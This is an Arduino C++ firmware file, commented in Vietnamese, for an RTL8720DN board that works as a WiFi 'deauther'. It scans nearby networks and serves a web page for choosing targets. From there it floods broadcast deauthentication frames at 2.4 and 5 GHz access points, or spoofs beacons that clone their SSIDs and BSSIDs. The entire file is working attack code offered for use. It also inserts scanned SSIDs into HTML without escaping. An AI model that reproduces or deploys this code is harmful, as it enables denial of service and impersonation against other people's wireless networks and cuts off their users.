#include <Arduino.h>
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <vector>
#include <map>
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"

// Bao gồm FreeRTOS (nếu SDK BW16 đã tích hợp FreeRTOS)
#include <FreeRTOS.h>
#include <task.h>

// Nếu LED đã được định nghĩa trong variant thì không định nghĩa lại
#ifndef LED_R
  #define LED_R 2
#endif
#ifndef LED_G
  #define LED_G 3
#endif
#ifndef LED_B
  #define LED_B 4
#endif

// --------------------------------------------------
// Các trạng thái của mạch
enum DeviceState {
  STATE_IDLE,     // Chỉ AP hoạt động
  STATE_SCANNING, // Đang quét mạng
  STATE_ATTACK,   // Đang tấn công deauth
  STATE_BEACON    // Đang phát Beacon (nhái)
};

volatile DeviceState currentState = STATE_IDLE;  // volatile vì được truy cập từ nhiều task

// Các hằng số LED pattern (millisecond)
const unsigned long BLINK_INTERVAL_ATTACK  = 1000;
const unsigned long BLINK_INTERVAL_SCANNING = 500;
const unsigned long BLINK_INTERVAL_BEACON   = 1000; // ví dụ: LED nhấp nháy theo chế độ beacon

// --------------------------------------------------
// Cấu trúc lưu trữ kết quả quét WiFi
struct WiFiScanResult {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
};

// Thông tin AP cho chế độ Access Point
const char *ssid_ap = "BW16";
const char *pass_ap = "deauther";

// Kênh mặc định (có thể thay đổi theo môi trường)
int current_channel = 12;

// Danh sách kết quả quét
std::vector<WiFiScanResult> scan_results;

// Các vector lưu các mục tiêu tấn công (dùng cho deauth)
std::vector<int> attack_targets_24;  // cho 2.4GHz (channel < 36)
std::vector<int> attack_targets_5;   // cho 5GHz (channel >= 36)

// Các vector lưu các mục tiêu beacon (dùng để “nhái” beacon)
std::vector<int> beacon_targets_24;  // cho 2.4GHz
std::vector<int> beacon_targets_5;   // cho 5GHz

// Địa chỉ BSSID tạm thời để gửi frame (cho deauth)
uint8_t deauth_bssid[6];

// Reason code mặc định cho deauth
const uint16_t DEFAULT_DEAUTH_REASON = 2;
uint16_t deauth_reason = DEFAULT_DEAUTH_REASON;

// Thay vì dùng hằng số chung, ta tách riêng số frame cho mỗi băng:
#define FRAMES_PER_DEAUTH_24 5    // số frame deauth gửi cho băng 2.4GHz
#define FRAMES_PER_DEAUTH_5  10    // số frame deauth gửi cho băng 5GHz
#define FRAMES_PER_BEACON    200   // số frame beacon gửi mỗi lần

// --------------------------------------------------
// Các khoảng thời gian riêng cho tấn công từng băng (ms)
const unsigned long ATTACK_INTERVAL_24 = 35;
const unsigned long ATTACK_INTERVAL_5  = 90;
unsigned long lastAttackTime24 = 0;
unsigned long lastAttackTime5  = 0;
static int currentTargetIndex24 = 0;
static int currentTargetIndex5  = 0;

// Các biến chỉ số cho beacon (các mục được “nhái”)
static int currentBeaconIndex24 = 0;
static int currentBeaconIndex5  = 0;

// --------------------------------------------------
// Hàm cập nhật LED theo trạng thái (non‑blocking)
void updateLEDs() {
  static unsigned long lastToggleTime = 0;
  static bool ledState = false;
  unsigned long now = millis();
  // Tắt tất cả LED trước khi cập nhật
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  if (currentState == STATE_IDLE) {
    // Idle: LED đỏ sáng ổn định
    digitalWrite(LED_R, HIGH);
  } else if (currentState == STATE_SCANNING) {
    if (now - lastToggleTime >= BLINK_INTERVAL_SCANNING) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_B, ledState ? HIGH : LOW);
  } else if (currentState == STATE_ATTACK) {
    if (now - lastToggleTime >= BLINK_INTERVAL_ATTACK) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_G, ledState ? HIGH : LOW);
  } else if (currentState == STATE_BEACON) {
    if (now - lastToggleTime >= BLINK_INTERVAL_BEACON) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_R, ledState ? HIGH : LOW);
  }
}

// --------------------------------------------------
// Hàm callback xử lý kết quả quét WiFi
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;  // đảm bảo chuỗi kết thúc
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(result.bssid, &record->BSSID, 6);
    char bssid_str[18] = {0};
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = String(bssid_str);
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

// --------------------------------------------------
// Hàm quét các mạng WiFi (khoảng 5 giây)
int scanNetworks() {
  currentState = STATE_SCANNING;
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    // Sử dụng vTaskDelay để không chặn scheduler
    vTaskDelay(pdMS_TO_TICKS(5000));
    DEBUG_SER_PRINT("Scan done!\n");
    currentState = STATE_IDLE;
    return 0;
  } else {
    DEBUG_SER_PRINT("Scan failed!\n");
    currentState = STATE_IDLE;
    return 1;
  }
}

// --------------------------------------------------
// Parse request HTTP: trả về URL (đã trim khoảng trắng)
String parseRequest(String request) {
  if (request.length() == 0) return "";
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  String path = request.substring(path_start, path_end);
  path.trim();
  return path;
}

// Phân tích dữ liệu POST thành các cặp key-value (không decode URL)
std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) return post_params;
    body_start += 4;
    String post_data = request.substring(body_start);
    int start = 0;
    int end = post_data.indexOf('&', start);
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');
        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value});
        }
        start = end + 1;
        end = post_data.indexOf('&', start);
    }
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }
    return post_params;
}

// --------------------------------------------------
// Tạo phản hồi HTTP (header)
String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\r\n";
  response += "Content-Type: " + content_type + "\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

// --------------------------------------------------
// Giao diện Web (HTML) – sử dụng CSS hiện đại, responsive
// Ở đây ta dùng 1 form chứa bảng các mạng quét được và 2 nút submit riêng cho deauth và beacon.
void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") +
  R"(
  <!DOCTYPE html>
  <html lang="vi">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RTL8720DN Deauther</title>
    <style>
      /* Reset cơ bản */
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body { font-family: Arial, Helvetica, sans-serif; background: #f2f4f8; color: #333; line-height: 1.4; padding: 5px; font-size: 14px; }
      .container { max-width: 960px; margin: 10px auto; background: #fff; border-radius: 8px; box-shadow: 0 3px 8px rgba(0,0,0,0.1); overflow: hidden; }
      header { background: #2980b9; color: #fff; padding: 10px; text-align: center; }
      header h1 { font-size: 1.4em; }
      main { padding: 10px; }
      table { width: 100%; border-collapse: collapse; margin-bottom: 10px; }
      thead { background: #3498db; color: #fff; }
      th, td { padding: 6px 4px; text-align: center; border-bottom: 1px solid #ddd; font-size: 0.8em; }
      tbody tr:nth-child(even) { background: #f9fafc; }
      .btn { display: block; width: 100%; border: none; border-radius: 4px; padding: 8px; margin-bottom: 8px; font-size: 0.9em; cursor: pointer; transition: background 0.3s ease; }
      .btn-launch { background: #27ae60; color: #fff; }
      .btn-launch:hover { background: #219150; }
      .btn-rescan { background: #3498db; color: #fff; }
      .btn-rescan:hover { background: #2980b9; }
      .btn-stop { background: #e74c3c; color: #fff; }
      .btn-stop:hover { background: #cf3e33; }
      @media (max-width: 600px) {
        header h1 { font-size: 1.2em; }
        th, td { padding: 4px; font-size: 0.75em; }
        .btn { padding: 6px; font-size: 0.8em; }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <h1>RTL8720DN Deauther</h1>
      </header>
      <main>
        <form method="post" action="/action">
          <table>
            <thead>
              <tr>
                <th>Select</th>
                <th>SSID</th>
                <th>BSSID</th>
                <th>Channel</th>
                <th>RSSI</th>
                <th>Freq</th>
              </tr>
            </thead>
            <tbody>
  )";
  // Hiển thị mỗi mạng quét được trong một dòng của bảng:
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<tr>";
    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
    response += "<td>" + scan_results[i].ssid + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + String((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "</tr>";
  }
  response += R"(
            </tbody>
          </table>
          <button type="submit" name="action" value="deauth" class="btn btn-launch">Launch Deauth</button>
          <button type="submit" name="action" value="beacon" class="btn btn-launch">Launch Beacon</button>
        </form>
        <form method="post" action="/rescan">
          <button type="submit" class="btn btn-rescan">Rescan Networks</button>
        </form>
  )";
  if (currentState == STATE_ATTACK || currentState == STATE_BEACON) {
    response += R"(
      <form method="post" action="/stop">
        <button type="submit" class="btn btn-stop">Stop Attack/Beacon</button>
      </form>
    )";
  }
  response += R"(
      </main>
    </div>
  </body>
  </html>
  )";
  client.write(response.c_str());
}

// --------------------------------------------------
// Hàm xử lý trang 404
void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain") + "Not found!";
  client.write(response.c_str());
}

// --------------------------------------------------
// Khởi tạo đối tượng WiFiServer toàn cục (port 80)
WiFiServer server(80);

// --------------------------------------------------
// Task: Cập nhật LED (non‑blocking)
void LEDUpdateTask(void *pvParameters) {
  (void) pvParameters;
  while (1) {
    updateLEDs();
    vTaskDelay(pdMS_TO_TICKS(50));
  }
}

// --------------------------------------------------
// Task: Web Server – lắng nghe và xử lý HTTP request
void WebServerTask(void *pvParameters) {
  (void) pvParameters;
  server.begin();
  while (1) {
    WiFiClient client = server.available();
    if (client && client.connected()) {
      String request;
      while (client.available()) {
        request += (char)client.read();
        vTaskDelay(pdMS_TO_TICKS(1));
      }
      if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
        client.stop();
      } else {
        DEBUG_SER_PRINT("Request: " + request + "\n");
        String path = parseRequest(request);
        DEBUG_SER_PRINT("Path: " + path + "\n");
        if (path == "/" || path == "/index.html") {
          handleRoot(client);
        } else if (path == "/rescan") {
          scanNetworks();
          handleRoot(client);
        } else if (path == "/action") {
          // Xử lý form gửi từ trang chủ (có nút "deauth" hoặc "beacon")
          std::vector<std::pair<String, String>> post_data = parsePost(request);
          String action = "";
          // Lấy tham số "action"
          for (auto &param : post_data) {
            if (param.first == "action") {
              action = param.second;
              break;
            }
          }
          if (action == "deauth") {
            // Xử lý deauth: lưu các mục tiêu theo băng
            attack_targets_24.clear();
            attack_targets_5.clear();
            for (auto &param : post_data) {
              if (param.first == "network") {
                int idx = param.second.toInt();
                if (idx >= 0 && idx < (int)scan_results.size()) {
                  uint8_t ch = scan_results[idx].channel;
                  if (ch >= 36)
                    attack_targets_5.push_back(idx);
                  else
                    attack_targets_24.push_back(idx);
                  DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                }
              }
            }
            if (!attack_targets_24.empty() || !attack_targets_5.empty()) {
              currentState = STATE_ATTACK;
              currentTargetIndex24 = 0;
              currentTargetIndex5 = 0;
              lastAttackTime24 = millis();
              lastAttackTime5  = millis();
            }
          } else if (action == "beacon") {
            // Xử lý beacon: lưu các mục tiêu để gửi beacon (nhái thông tin từ các mục đã quét)
            beacon_targets_24.clear();
            beacon_targets_5.clear();
            for (auto &param : post_data) {
              if (param.first == "network") {
                int idx = param.second.toInt();
                if (idx >= 0 && idx < (int)scan_results.size()) {
                  uint8_t ch = scan_results[idx].channel;
                  if (ch >= 36)
                    beacon_targets_5.push_back(idx);
                  else
                    beacon_targets_24.push_back(idx);
                  DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                }
              }
            }
            if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
              currentState = STATE_BEACON;
              currentBeaconIndex24 = 0;
              currentBeaconIndex5 = 0;
            }
          }
          handleRoot(client);
        } else if (path == "/stop") {
          currentState = STATE_IDLE;
          attack_targets_24.clear();
          attack_targets_5.clear();
          beacon_targets_24.clear();
          beacon_targets_5.clear();
          handleRoot(client);
        } else {
          handle404(client);
        }
        client.stop();
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

// --------------------------------------------------
// Task: Thực hiện tấn công deauth (gửi deauth frames)
void AttackTask(void *pvParameters) {
  (void) pvParameters;
  while (1) {
    if (currentState == STATE_ATTACK) {
      unsigned long now = millis();
      
      // Xử lý cho băng 2.4GHz
      if (!attack_targets_24.empty() && (now - lastAttackTime24 >= ATTACK_INTERVAL_24)) {
        int idx = attack_targets_24[currentTargetIndex24];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          memcpy(deauth_bssid, scan_results[idx].bssid, 6);
          for (int j = 0; j < FRAMES_PER_DEAUTH_24; j++) {
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            vTaskDelay(pdMS_TO_TICKS(5));
          }
          DEBUG_SER_PRINT("Attacked 2.4GHz target idx: " + String(idx) + "\n");
        }
        currentTargetIndex24 = (currentTargetIndex24 + 1) % attack_targets_24.size();
        lastAttackTime24 = now;
      }
      
      // Xử lý cho băng 5GHz
      if (!attack_targets_5.empty() && (now - lastAttackTime5 >= ATTACK_INTERVAL_5)) {
        int idx = attack_targets_5[currentTargetIndex5];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          memcpy(deauth_bssid, scan_results[idx].bssid, 6);
          for (int j = 0; j < FRAMES_PER_DEAUTH_5; j++) {
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            vTaskDelay(pdMS_TO_TICKS(5));
          }
          DEBUG_SER_PRINT("Attacked 5GHz target idx: " + String(idx) + "\n");
        }
        currentTargetIndex5 = (currentTargetIndex5 + 1) % attack_targets_5.size();
        lastAttackTime5 = now;
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

// --------------------------------------------------
// Task: Thực hiện phát Beacon (gửi beacon frames “nhái” thông tin mục tiêu)
// Mỗi mục tiêu được gửi 20 beacon frame.
void BeaconTask(void *pvParameters) {
  (void) pvParameters;
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  while (1) {
    if (currentState == STATE_BEACON) {
      // Xử lý các mục tiêu băng 2.4GHz
      if (!beacon_targets_24.empty()) {
        int idx = beacon_targets_24[currentBeaconIndex24];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
            // Gửi beacon frame với BSSID và SSID lấy từ mục tiêu đã chọn
            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
            vTaskDelay(pdMS_TO_TICKS(5));
          }
          DEBUG_SER_PRINT("Beacon sent for 2.4GHz target idx: " + String(idx) + "\n");
        }
        currentBeaconIndex24 = (currentBeaconIndex24 + 1) % beacon_targets_24.size();
      }
      // Xử lý các mục tiêu băng 5GHz
      if (!beacon_targets_5.empty()) {
        int idx = beacon_targets_5[currentBeaconIndex5];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
            vTaskDelay(pdMS_TO_TICKS(5));
          }
          DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(idx) + "\n");
        }
        currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

// --------------------------------------------------
// setup(): khởi tạo WiFi AP, quét mạng ban đầu và tạo các task FreeRTOS
void setup() {
  // Cấu hình chân LED
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();

  char channelStr[4];
  snprintf(channelStr, sizeof(channelStr), "%d", current_channel);
  WiFi.apbegin((char*)ssid_ap, (char*)pass_ap, channelStr);

  // Quét mạng ban đầu
  scanNetworks();

  currentState = STATE_IDLE;
  digitalWrite(LED_R, HIGH);  // Idle: LED đỏ sáng

  // Tạo các task FreeRTOS
  xTaskCreate(LEDUpdateTask, "LEDUpdate", 1024, NULL, 1, NULL);
  xTaskCreate(WebServerTask, "WebServer", 4096, NULL, 1, NULL);
  xTaskCreate(AttackTask, "Attack", 2048, NULL, 2, NULL);
  xTaskCreate(BeaconTask, "Beacon", 2048, NULL, 2, NULL);
}

// --------------------------------------------------
// loop()
void loop() {
  updateLEDs();

  // Xử lý HTTP nếu cần (trường hợp không dùng task WebServer)
  WiFiClient client = server.available();
  if (client.connected()) {
    String request;
    while (client.available()) {
      request += (char)client.read();
      delay(1);
    }
    
    if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
      client.stop();
      return;
    }
    
    DEBUG_SER_PRINT("Request: " + request + "\n");
    String path = parseRequest(request);
    DEBUG_SER_PRINT("Path: " + path + "\n");

    if (path == "/" || path == "/index.html") {
      handleRoot(client);
    } 
    else if (path == "/rescan") {
      scanNetworks();
      handleRoot(client);
    } 
    else if (path == "/action") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      String action = "";
      for (auto &param : post_data) {
        if (param.first == "action") {
          action = param.second;
          break;
        }
      }
      if (action == "deauth") {
        attack_targets_24.clear();
        attack_targets_5.clear();
        for (auto &param : post_data) {
          if (param.first == "network") {
            int idx = param.second.toInt();
            if (idx >= 0 && idx < (int)scan_results.size()) {
              uint8_t ch = scan_results[idx].channel;
              if (ch >= 36)
                attack_targets_5.push_back(idx);
              else
                attack_targets_24.push_back(idx);
              DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
            }
          }
        }
        if (!attack_targets_24.empty() || !attack_targets_5.empty()) {
          currentState = STATE_ATTACK;
          currentTargetIndex24 = 0;
          currentTargetIndex5 = 0;
          lastAttackTime24 = millis();
          lastAttackTime5  = millis();
        }
      } else if (action == "beacon") {
        beacon_targets_24.clear();
        beacon_targets_5.clear();
        for (auto &param : post_data) {
          if (param.first == "network") {
            int idx = param.second.toInt();
            if (idx >= 0 && idx < (int)scan_results.size()) {
              uint8_t ch = scan_results[idx].channel;
              if (ch >= 36)
                beacon_targets_5.push_back(idx);
              else
                beacon_targets_24.push_back(idx);
              DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
            }
          }
        }
        if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
          currentState = STATE_BEACON;
          currentBeaconIndex24 = 0;
          currentBeaconIndex5 = 0;
        }
      }
      handleRoot(client);
    } else if (path == "/stop") {
      currentState = STATE_IDLE;
      attack_targets_24.clear();
      attack_targets_5.clear();
      beacon_targets_24.clear();
      beacon_targets_5.clear();
      handleRoot(client);
    } else {
      handle404(client);
    }
    client.stop();
  }
  // Nếu dùng task WebServer, loop() không cần xử lý HTTP liên tục.
}
